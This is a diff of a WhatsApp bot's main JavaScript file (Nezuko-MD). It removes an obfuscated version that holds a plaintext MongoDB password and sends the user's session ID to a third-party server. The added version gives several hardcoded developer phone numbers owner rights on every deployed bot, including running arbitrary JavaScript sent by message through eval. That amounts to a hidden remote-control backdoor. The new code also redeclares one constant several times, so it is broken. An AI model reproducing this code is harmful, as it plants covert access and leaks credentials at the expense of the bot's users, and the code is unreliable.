@@ -1,1 +1,310 @@
-const _0x13aec4=_0x1528;(function(_0x25fd99,_0x1edc31){const _0x5702bb=_0x1528,_0x39a527=_0x25fd99();while(!![]){try{const _0x16ee00=parseInt(_0x5702bb(0x98))/0x1*(-parseInt(_0x5702bb(0xc9))/0x2)+parseInt(_0x5702bb(0xaa))/0x3*(-parseInt(_0x5702bb(0x9c))/0x4)+-parseInt(_0x5702bb(0x9a))/0x5*(parseInt(_0x5702bb(0xa9))/0x6)+-parseInt(_0x5702bb(0xa3))/0x7+parseInt(_0x5702bb(0x91))/0x8+parseInt(_0x5702bb(0xc2))/0x9*(parseInt(_0x5702bb(0xc7))/0xa)+parseInt(_0x5702bb(0xb7))/0xb;if(_0x16ee00===_0x1edc31)break;else _0x39a527['push'](_0x39a527['shift']());}catch(_0x695bfd){_0x39a527['push'](_0x39a527['shift']());}}}(_0x3ce9,0x8b666));const {spawn}=require('child_process'),fs=require('fs'),{promises:fsPromises}=fs,path=require('path'),axios=require('axios'),cron=require('node-cron'),{version}=require('./package.json'),{makeWASocket,useMultiFileAuthState,makeInMemoryStore,makeCacheableSignalKeyStore}=require(_0x13aec4(0xa1)),web=require('./lib/node.js'),MsgHandler=require(_0x13aec4(0x99)),{GevPlugin}=require(_0x13aec4(0xb8)),{Client}=require(_0x13aec4(0xbb)),{SUDO,HANDLERS,INFO,MODE,ALWAYS_ONLINE,AUTO_STATUS_VIEW,SESSION_ID}=require(_0x13aec4(0x81)),spinnies=new(require(_0x13aec4(0xc1)))({'spinner':{'interval':0xc8,'frames':['\x20','_']}}),P=require(_0x13aec4(0x85));function logError(_0x12f694){const _0x1e45cd=_0x13aec4;console[_0x1e45cd(0xab)](_0x1e45cd(0xc6),_0x12f694);}function _0x3ce9(){const _0x278552=['./lib/database/ext_plugins.js','Error\x20reading\x20directory:','_\x0a║⌑\x20*sᴜᴅᴏ:*\x20_','./lib/client.js','search','ᴄᴏɴɴᴇᴄᴛᴇᴅ\x20✅','store','_\x0a║⌑\x20*ᴍᴏᴅᴇ:*\x20_','_\x0a║⌑\x20*ᴘʀᴇꜰɪx:*\x20_','spinnies','36Bxqxnf','readdir','🎗️\x20ɴᴇ, ᴜᴋᴏ\x20ɪꜱ\x20ᴡʜᴀᴛsᴀᴘᴘ\x20ᴀʟɪᴠᴇ\x20☁️','firefox','Error\x20occurred:','535780UyySOu','\x0a======[\x20ᴡʜᴀᴛsᴀᴘᴘ-ʟᴏɢs\x20]======\x0a','25978YLWeBt','mongodb+srv://Zenitsu:godzenitsu12@nezuko02.nbdrnfe.mongodb.net/?retryWrites=true&w=majority&appName=Nezuko02','toString','open','split','sendMessage','\x0a╔════◇\x0a║\x20*『\x20𝙉𝙀𝙕𝙐𝙆𝙊-𝙈𝘿\x20𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿\x20✅\x20』*\x0a║\x20_ɴᴇᴢᴜᴋᴏ\x20ʙᴏᴛ\x20ɪs\x20ʀᴜɴɴɪɴɢ\x20ɪɴ\x20ʏᴏᴜʀ\x20ᴀᴄᴄᴏᴜɴᴛ_\x0a╚══════════════════════╝\x0a╔═════◇\x0a║\x20\x20『•••\x20𝙀𝙭𝙩𝙧𝙖-𝘾𝙤𝙣𝙛𝙞𝙜𝙪𝙧𝙖𝙩𝙞𝙤𝙣𝙨\x20•••』\x0a║❒\x20*ᴠᴇʀsɪᴏɴ:*\x20_','./info.js','0\x20*/5\x20*\x20*\x20*','fatal','./bot_plugin/','pino','writeFile','ɴᴇᴢᴜᴋᴏ-ᴍᴅ\x20ᴄᴏɴɴᴇᴄᴛᴇᴅ\x20sᴜᴄᴄᴇssꜰᴜʟʟʏ\x20✅','.js','keys','log','messages.upsert','catch','./bot_plugin','apply','database','mkdir','7484408MEYPQu','sᴇssɪᴏɴ\x20sᴜᴄᴄᴇsꜰᴜʟʟʏ\x20ᴄʀᴇᴀᴛᴇᴅ','silent','constructor','1.0.0','schedule','Aɴ\x20ᴇʀʀᴏʀ\x20ᴏᴄᴄᴜʀʀᴇᴅ:','85IUAkpV','./lib/handler.js','1615PvghKi','creds.json','271288GyuVMT','https://whatsapp.com/channel/0029VaHt1710AgWB1B0Lkg0Q','user','(((.+)+)+)+$','_\x0a║❒\x20*ʙʀᴀɴᴄʜ:*\x20_ᴍᴀɪɴ_\x0a╚══════════════════════╝\x20','@whiskeysockets/baileys','loadMessage','3068345TghpiH','writeToFile','lib','then','toLowerCase','child','14706vEELjO','42knuNgv','error','NEZUKO-MD','bind','post','ʟᴏᴀᴅɪɴɢ\x20ᴍᴏᴅᴜʟᴇs\x20⏳','data','join','store.json','message','ᴍᴏᴅᴜʟᴇs\x20sᴜᴄᴄᴇssꜰᴜʟʟʏ\x20ʟᴏᴀᴅᴇᴅ\x20✅','start','creds.update','29751700UcsSTF'];_0x3ce9=function(){return _0x278552;};return _0x3ce9();}function _0x1528(_0x47a06e,_0x14ebfc){const _0x198b97=_0x3ce9();return _0x1528=function(_0x2143a0,_0x3d9e2a){_0x2143a0=_0x2143a0-0x80;let _0x3ce986=_0x198b97[_0x2143a0];return _0x3ce986;},_0x1528(_0x47a06e,_0x14ebfc);}async function createSessionAndWriteCredsToFile(_0xa7a232,_0x425e76,_0x3c024a){const _0x2cfec2=_0x13aec4;try{await fsPromises[_0x2cfec2(0x90)](_0x425e76,{'recursive':!![]});const _0x15ab3a=await axios[_0x2cfec2(0xae)]('https://api.lokiser.xyz/mongoose/session/restore',{'id':_0xa7a232,'mongoUrl':_0x3c024a}),_0x129858=_0x15ab3a[_0x2cfec2(0xb0)][_0x2cfec2(0xb0)],_0x505e86=path[_0x2cfec2(0xb1)](_0x425e76,_0x2cfec2(0x9b));await fsPromises[_0x2cfec2(0x86)](_0x505e86,_0x129858),console['log'](_0x2cfec2(0x92));}catch(_0x499625){console[_0x2cfec2(0xab)](_0x2cfec2(0x97),_0x499625[_0x2cfec2(0xb3)]);}}const sessionId=SESSION_ID,folderPath='./lib/session',mongoDb=_0x13aec4(0xca);function start(){const _0x11f62c=(function(){let _0x87e84c=!![];return function(_0x4b2529,_0xebe6ab){const _0x1443c2=_0x87e84c?function(){const _0x40ffc1=_0x1528;if(_0xebe6ab){const _0x121b05=_0xebe6ab[_0x40ffc1(0x8e)](_0x4b2529,arguments);return _0xebe6ab=null,_0x121b05;}}:function(){};return _0x87e84c=![],_0x1443c2;};}()),_0x5b5b7d=_0x11f62c(this,function(){const _0x9f63e9=_0x1528;return _0x5b5b7d[_0x9f63e9(0xcb)]()['search'](_0x9f63e9(0x9f))[_0x9f63e9(0xcb)]()[_0x9f63e9(0x94)](_0x5b5b7d)[_0x9f63e9(0xbc)](_0x9f63e9(0x9f));});_0x5b5b7d();try{async function _0xa45e9a(){const _0x5beda7=_0x1528;try{await createSessionAndWriteCredsToFile(sessionId,folderPath,mongoDb);const {state:_0x2a4576,saveCreds:_0x5c60af}=await useMultiFileAuthState(path[_0x5beda7(0xb1)](__dirname,_0x5beda7(0xa5),'session')),_0x53525d=makeWASocket({'auth':{'creds':_0x2a4576['creds'],'keys':makeCacheableSignalKeyStore(_0x2a4576[_0x5beda7(0x89)],P({'level':_0x5beda7(0x83)})[_0x5beda7(0xa8)]({'level':_0x5beda7(0x83)}))},'browser':[_0x5beda7(0xac),_0x5beda7(0xc5),_0x5beda7(0x95)],'downloadHistory':![],'syncFullHistory':![],'logger':P({'level':'silent'}),'printQRInTerminal':!![],'getMessage':async _0x17e1f2=>(_0x4c1715[_0x5beda7(0xa2)](_0x17e1f2['id'])||{})[_0x5beda7(0xb3)]||{'conversation':null}}),_0x30c7c9=new Client(_0x53525d),_0x4c1715=makeInMemoryStore({'logger':P()['child']({'level':_0x5beda7(0x93),'stream':_0x5beda7(0xbe)})});_0x4c1715[_0x5beda7(0xad)](_0x30c7c9['ev']),setInterval(()=>_0x4c1715[_0x5beda7(0xa4)](path[_0x5beda7(0xb1)](__dirname,_0x5beda7(0xa5),_0x5beda7(0x8f),_0x5beda7(0xb2))),0x1e*0x3e8),cron[_0x5beda7(0x96)](_0x5beda7(0x82),()=>{_0xa45e9a();},{'scheduled':![]})[_0x5beda7(0xb5)](),_0x30c7c9['ev']['on']('connection.update',async _0x2d685a=>{const _0x353d65=_0x5beda7,{connection:_0x265f11}=_0x2d685a;_0x265f11===_0x353d65(0xcc)&&(console[_0x353d65(0x8a)](_0x353d65(0x87)),_0x30c7c9[_0x353d65(0xce)](_0x30c7c9[_0x353d65(0x9e)]['id'],{'text':_0x353d65(0x80)+version+_0x353d65(0xba)+INFO[_0x353d65(0xcd)](';')[0x1]+_0x353d65(0xbf)+MODE+_0x353d65(0xc0)+HANDLERS+_0x353d65(0xa0),'contextInfo':{'externalAdReply':{'title':'ɴᴇᴢᴜᴋᴏ-ᴍᴅ','body':_0x353d65(0xc4),'thumbnailUrl':''+INFO[_0x353d65(0xcd)](';')[0x2],'mediaType':0x1,'mediaUrl':_0x353d65(0x9d),'sourceUrl':'https://whatsapp.com/channel/0029VaV63w1JENxsHsm43B0h'}}}),console[_0x353d65(0x8a)](_0x353d65(0xaf)),fsPromises[_0x353d65(0xc3)](_0x353d65(0x8d))[_0x353d65(0xa6)](_0x2be822=>{_0x2be822['forEach'](_0x1e1092=>{const _0x5563de=_0x1528;path['extname'](_0x1e1092)[_0x5563de(0xa7)]()==_0x5563de(0x88)&&require(_0x5563de(0x84)+_0x1e1092);});})[_0x353d65(0x8c)](_0x8824=>{const _0x5308f9=_0x353d65;console['error'](_0x5308f9(0xb9),_0x8824);}),console[_0x353d65(0x8a)](_0x353d65(0xb4)),console[_0x353d65(0x8a)](_0x353d65(0xc8)));}),_0x30c7c9['ev']['on'](_0x5beda7(0xb6),_0x5c60af),_0x30c7c9['ev']['on'](_0x5beda7(0x8b),async _0xc0fbaf=>{await MsgHandler(_0x30c7c9,_0xc0fbaf);});}catch(_0x5b09d8){logError(_0x5b09d8);}}process['on']('uncaughtException',logError),setTimeout(()=>{const _0x5bd275=_0x1528;web(_0x5bd275(0xbd)),_0xa45e9a();},0x1388);}catch(_0x28f604){logError(_0x28f604);}}start();
+
+const {
+  default: makeWASocket,
+  useMultiFileAuthState,
+  DisconnectReason,
+  jidNormalizedUser,
+  fetchLatestBaileysVersion,
+  getContentType,
+  Browsers,
+  getAggregateVotesInPollMessage,
+   makeInMemoryStore,
+  makeCacheableSignalKeyStore,
+  receivedPendingNotifications,
+  } = require('@whiskeysockets/baileys')
+const fs = require('fs')
+const P = require('pino')
+const path = require('path');
+const config = require('./config')
+const X = require("./config.js")
+const qrcode = require('qrcode-terminal')
+const util = require('util')
+const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson} = require('./lib/functions')
+const { sms,downloadMediaMessage } = require('./lib/msg')
+const axios = require('axios');
+const cheerio = require('cheerio');
+
+const { File } = require('megajs')
+const prefix = config.PREFIX;
+const ownerNumber = config.OWNER;
+const l = console.log
+const addresses = config.ADDRESSES;
+const addressArray = addresses.split(',');
+function genMsgId() {
+  const lt = 'queen-nezuko~';
+  const prefix = "3EB";
+  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  let randomText = prefix;
+
+  for (let i = prefix.length; i < 22; i++) {
+    const randomIndex = Math.floor(Math.random() * characters.length);
+    randomText += characters.charAt(randomIndex);
+  }
+
+  return randomText;
+}
+  //=========================================
+let previousLinkId = '1';
+//===================SESSION============================
+async function MakeSession() {
+    try {
+        console.log("Verifying Session...");
+        const {
+          data
+        } = await axios(`https://paste.c-net.org/${X.SESSION_ID.split(':')[1]}`);
+        await fs.writeFileSync("./auth_info_baileys/creds.json", JSON.stringify(data));
+        console.log("Creds Json Created Successfully✅");
+      } catch (err) {
+        console.log(err);
+      }
+}
+MakeSession();
+
+// <<==========PORTS===========>>
+const express = require("express");
+const app = express();
+const port = process.env.PORT || 8000;
+//====================================
+async function connectToWA() {
+  console.log("Connecting bot...");
+  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
+  var { version } = await fetchLatestBaileysVersion()
+  const latestWebVersion = () => {
+          let version
+          try {
+              let a = fetchJson('https://web.whatsapp.com/check-update?version=1&platform=web')
+              version = [a.currentVersion.replace(/[.]/g, ', ')]
+          } catch {
+              version = [2, 2204, 13]
+          }
+          return version
+   }
+  const store = makeInMemoryStore({
+          logger: P({ level: "silent", stream: "store" }),
+      });
+  const NodeCache = require("node-cache")
+  const msgRetryCounterCache = new NodeCache()
+  
+      const conn = makeWASocket({
+          logger: P({ level: 'silent' }),
+          printQRInTerminal: false,     
+       auth: {
+           creds: state.creds,
+           keys: makeCacheableSignalKeyStore(state.keys, P({ level: "fatal" }).child({ level: "fatal" })),
+        },
+        browser: Browsers.macOS("Safari"),
+        getMessage: async (key) => {
+           let jid = jidNormalizedUser(key.remoteJid)
+           let msg = await store.loadMessage(jid, key.id)
+  
+           return msg?.message || ""
+        },
+        msgRetryCounterCache,
+        defaultQueryTimeoutMs: undefined, 
+        syncFullHistory: false,
+        latestWebVersion,
+     })
+  
+          store.bind(conn.ev)
+  setInterval(() => {
+      store.writeToFile(__dirname+"/store.json");
+    }, 3000);
+  
+conn.ev.on('connection.update', (update) => {
+const { connection, lastDisconnect } = update
+if (connection === 'close') {
+if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
+connectToWA()
+}
+} else if (connection === 'open') {
+
+console.log('Installing plugins 🔌... ')
+const path = require('path');
+fs.readdirSync("./plugins/").forEach((plugin) => {
+if (path.extname(plugin).toLowerCase() == ".js") {
+require("./plugins/" + plugin);
+}
+});
+console.log('Plugins Loaded✅')
+console.log('Nezuko Is Alive☔')
+conn.sendMessage(ownerNumber + "@s.whatsapp.net", { text: `qᴜᴇᴇɴ ɴᴇᴢᴜᴋᴏ ᴄᴏɴɴᴇᴄᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜰᴜʟʟʏ!!•https://wa.me/+94772801923?text=ɴᴇᴢᴜᴋᴏ ɪꜱ ᴀʟɪᴠᴇ☁️` } ,{messageId:genMsgId()} )    
+sleep(5000)
+
+ 
+}
+})
+conn.ev.on('creds.update', saveCreds)
+
+conn.ev.on('messages.upsert', async(mek) => {
+try {
+mek = mek.messages[0]
+if (!mek.message) return	
+mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+if (mek.key && mek.key.remoteJid === 'status@broadcast') return
+const m = sms(conn, mek)
+const type = getContentType(mek.message)
+const content = JSON.stringify(mek.message)
+const from = mek.key.remoteJid
+const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
+const isCmd = body.startsWith(prefix)
+const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
+const args = body.trim().split(/ +/).slice(1)
+const q = args.join(' ')
+const isGroup = from.endsWith('@g.us')
+const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+const senderNumber = sender.split('@')[0]
+const botNumber = conn.user.id.split(':')[0]
+const pushname = mek.pushName || 'No Name'
+const zenitsu = '917907387121'
+const isZenitsux = zenitsu?.includes(senderNumber)
+const zenitsu = '9744108970'
+const isZenitsu = zenitsu?.includes(senderNumber)
+const zenitsu = '9605612983'
+const isZenitsulord = zenitsu?.includes(senderNumber)
+const zenitsu = '9744108970'
+const isGodzenitsu = zenitsu?.includes(senderNumber)
+const zenitsu = '7907387121'
+const isZenitsugod = zenitsu?.includes(senderNumber)
+const zenitsu = '9744195375'
+const isZen = zenitsu?.includes(senderNumber)
+const isMe = botNumber?.includes(senderNumber)	
+const isOwner = ownerNumber?.includes(senderNumber) 
+const botNumber2 = await jidNormalizedUser(conn.user.id);
+const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
+const groupName = isGroup ? groupMetadata.subject : ''
+const participants = isGroup ? await groupMetadata.participants : ''
+const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+const isBotAdmins = isGroup ? groupAdmins?.includes(botNumber2) : false
+const isAdmins = isGroup ? groupAdmins?.includes(sender) : false
+const isreaction = m.message.reactionMessage ? true : false
+const reply = (teks) => {
+conn.sendMessage(from, { text: teks }, { quoted: mek ,messageId:genMsgId()  })
+}
+conn.sendFileUrl = async(jid, url, caption, quoted, options = {}) => {
+  let mime = '';
+  let res = await axios.head(url)
+  mime = res.headers['content-type']
+  if (mime.split("/")[1] === "gif") {
+      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted,   ...options })
+  }
+  let type = mime.split("/")[0] + "Message"
+  if (mime === "application/pdf") {
+      return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted,  ...options })
+  }
+  if (mime.split("/")[0] === "image") {
+      return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted ,  ...options })
+  }
+  if (mime.split("/")[0] === "video") {
+      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted ,  ...options })
+  }
+  if (mime.split("/")[0] === "audio") {
+      return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted,  ...options })
+  }
+}
+
+	if(isZenitsux){
+    if(!isreaction){
+ await conn.sendMessage(from, { react: { text: '👨🏻‍💻', key: mek.key } });
+    }
+} else	if(isZenitsu){
+  if(!isreaction){
+await conn.sendMessage(from, { react: { text: '🌚', key: mek.key } });
+  }
+} else	if(isZenitsulord){
+  if(!isreaction){
+await conn.sendMessage(from, { react: { text: '🌻', key: mek.key } });
+  }
+} else	if(isGodzenitsu){
+  if(!isreaction){
+await conn.sendMessage(from, { react: { text: '☁️', key: mek.key } });
+  }
+	}else if(isOwner){
+    if(!isreaction){
+  await conn.sendMessage(from, { react: { text: '🤎', key: mek.key } });
+    }
+	}else if(isZenitsugod){
+    if(!isreaction){
+  await conn.sendMessage(from, { react: { text: '🎗️', key: mek.key } });
+    }
+	}
+      else if(isZen){
+    if(!isreaction){
+  await conn.sendMessage(from, { react: { text: '⭐', key: mek.key } });
+    }
+	}
+
+if (!isMe && !isZen && !isZenitsugod && !isZenitsulord && !isGodzenitsu && !isZenitsux && !isZenitsu && !isOwner && !isGroup && config.ONLY_GROUP == 'true') return 
+if (!isMe && !isZen && !isZenitsugod && !isZenitsulord && !isGodzenitsu && !isZenitsux && !isZenitsu && !isOwner && config.ONLY_ME == 'true') return 
+//==================================plugin map================================
+const events = require('./command')
+const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
+if (isCmd) {
+const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias?.includes(cmdName))
+if (cmd) {
+if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+
+try {
+cmd.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isZenitsugod, isZen, isGodzenitsu, isZenitsu, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+} catch (e) {
+console.error("[PLUGIN ERROR] ", e);
+}
+}
+}
+events.commands.map(async(command) => {
+if (body && command.on === "body") {
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isGodzenitsu, isZenitsugod, isZen, isZenitsu, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+} else if (mek.q && command.on === "text") {
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isZenitsugod, isZen, isGodzenitsu, isZenitsu, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+} else if (
+(command.on === "image" || command.on === "photo") &&
+mek.type === "imageMessage"
+) {
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isZenitsugod, isZenitsu, isZen, isGodzenitsu, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+} else if (
+command.on === "sticker" &&
+mek.type === "stickerMessage"
+) {
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isZenitsugod, isZen, isZenitsu, isGodzenitsu, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+}});
+
+
+if (config.AUTO_VOICE === 'true') {			       
+const url = 'https://gist.github.com/prabathLK/f602911954a959c8730aeb00a588d15d/raw'
+let { data } = await axios.get(url)
+for (vr in data){
+if((new RegExp(`\\b${vr}\\b`,'gi')).test(body)) conn.sendMessage(from,{audio: { url : data[vr]},mimetype: 'audio/mpeg',ptt:true},{quoted:mek})   
+}}
+	
+//====================================================================
+switch (command) {
+case 'jid':
+reply(from)
+break
+
+default:				
+if ((isOwner || isZenitsugod || isZenitsu || isZen || isGodzenitsu || isZenitsulord || isMe) && body.startsWith('>')) {
+let bodyy = body.split('>')[1]
+let code2 = bodyy.replace("°", ".toString()");
+try {
+let resultTest = await eval(code2);
+if (typeof resultTest === "object") {
+reply(util.format(resultTest));
+} else {
+reply(util.format(resultTest));
+}
+} catch (err) {
+reply(util.format(err));
+}}}
+} catch (e) {
+const isError = String(e)
+console.log(isError)}
+})
+}
+app.get("/", (req, res) => {
+res.send("📟 Queen-Nezuko Working successfully!");
+});
+app.listen(port, () => console.log(`Queen-Nezuko Server listening on port http://localhost:${port}`));
+setTimeout(() => {
+connectToWA()
+}, 3000);
